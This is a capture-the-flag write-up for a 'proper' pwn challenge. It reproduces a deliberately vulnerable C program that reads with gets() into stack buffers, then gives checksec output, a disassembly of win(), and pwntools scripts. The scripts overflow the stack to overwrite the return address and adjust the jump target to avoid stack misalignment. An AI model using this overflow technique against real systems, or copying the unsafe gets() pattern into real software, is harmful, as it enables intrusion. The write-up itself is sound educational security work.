# Introduction

In this challenge we are given a [zip file](https://github.com/chouettevan/CTF-writeups/raw/refs/heads/main/assets/bronco2026/proper.zip) containing
among others, a source file named `proper.c`:

```c
#include <stdio.h>
#include <string.h>

#define CLOSED 0
#define ALIVE 41

void init() {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
}

void win() {
    printf("\n[-] oh my goodness, you're the greatest C pwner of all time. yoshie bows down to your prowess.\n");
    system("/bin/cat flag.txt");
    exit(0);
}

void treasure_room() {
    char buffer[6767]; // thought it couldn't get funnier, huh?

    gets(buffer);

    printf("\nTREASURE?\n");
    return;
}

int gate3() {
    volatile int gate = CLOSED;
    char buffer[67]; // HAHAHAHAHAHA you so funny.

    gets(buffer);
    if (gate == CLOSED) {
        printf("\n[-] Try again. Gate 3 slams shut in your face.\n");
        return -1;
    } else if (gate == 13371337) {
        printf("\n[+] Gate 3 opens, and you find some treasure. It says 'win() is that way, located at %p'\n", (void *)win);
        return 1;
    }
    else {
        printf("\n[-] Try again. Gate 3 creaks, but remains shut.");
        return -1;
    }
}

int gate2() {
    volatile int gate = CLOSED;
    volatile int baby_chicken = ALIVE;
    long buffer[64];

    gets(buffer);
    if (baby_chicken != ALIVE) {
        printf("\n[-] YOU KILLED THE CHICKEN. Gate 2 retaliates aggressively.\n");
        return -1;
    }
    if (gate == CLOSED) {
        printf("\n[-] Try again. Gate 2 refuses to open.\n");
        return -1;
    } else {
        printf("\n[+] Well done. Gate 2 opens.\n");
        return 1;
    }
}

int gate1() {
    volatile int gate = CLOSED;
    int buffer[64];

    gets(buffer);
    if (gate == CLOSED) {
        printf("\n[-] Sorry, Gate 1 refuses to open.\n");
        return -1;
    } else {
        printf("\n[+] Well done. Gate 1 opens.\n");
        return 1;
    }

}

int main(int argc, char *argv[]) {
    init();

    if (gate1() == -1) {
        return 0;
    }
    if (gate2() == -1) {
        return 0;
    }
    if (gate3() == -1)  {
        return 0;
    }
    treasure_room();
    printf("\nNo :(\n");
    return 0;
}

// gcc proper.c -o proper -fno-stack-protector -z execstack -no-pie
```

## Analysis
We notice the that `gate1()` contains a trivial buffer overflow:
```c
int gate1() {
    volatile int gate = CLOSED;
    int buffer[64];

    gets(buffer);
    if (gate == CLOSED) {
        printf("\n[-] Sorry, Gate 1 refuses to open.\n");
        return -1;
    } else {
        printf("\n[+] Well done. Gate 1 opens.\n");
        return 1;
    }

}
```
furthermore, there is a `win()` function:
```c
void win() {
    printf("\n[-] oh my goodness, you're the greatest C pwner of all time. yoshie bows down to your prowess.\n");
    system("/bin/cat flag.txt");
    exit(0);
}
```
looking at the binary's protections,we see the following:
```fish
[I] ◆ proper_pwn ❯❯❯ pwn checksec proper
[*] 'proper'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
No `PIE`. that is all we need. We can overwrite the return address to point to `win()`, like so:
```python
from pwn import *
#target = process("./proper")
target = remote('0.cloud.chals.io',21543)
elf = ELF("./proper")
#elf = target.elf

payload = b'a'*280 + p64(elf.sym['win'])
target.sendline(payload)
target.interactive()
```
## Stack details

This is not quite a solve script: running it causes
a segfault due to stack misalignment. looking in the binary's `win()` function, we see this:
```asm
000000000040123b <win>:
  40123b:	f3 0f 1e fa          	endbr64
  40123f:	55                   	push   rbp
  401240:	48 89 e5             	mov    rbp,rsp
  401243:	48 8d 05 be 0d 00 00 	lea    rax,[rip+0xdbe]        # 402008 <_IO_stdin_used+0x8>
  40124a:	48 89 c7             	mov    rdi,rax
  40124d:	e8 3e fe ff ff       	call   401090 <puts@plt>
  401252:	48 8d 05 0f 0e 00 00 	lea    rax,[rip+0xe0f]        # 402068 <_IO_stdin_used+0x68>
  401259:	48 89 c7             	mov    rdi,rax
  40125c:	b8 00 00 00 00       	mov    eax,0x0
  401261:	e8 3a fe ff ff       	call   4010a0 <system@plt>
  401266:	bf 00 00 00 00       	mov    edi,0x0
  40126b:	e8 70 fe ff ff       	call   4010e0 <exit@plt>
```
here we see the function prelude ends at `0x401243`, and can now jump there to
avoid stack alignment problems:

```python
from pwn import *
#target = process("./proper")
target = remote('0.cloud.chals.io',21543)
elf = ELF("./proper")
#elf = target.elf

payload = b'a'*280 + p64(0x00401243)#+ p64(elf.sym['win'])
target.sendline(payload)
target.interactive()
```
Challenge solved.
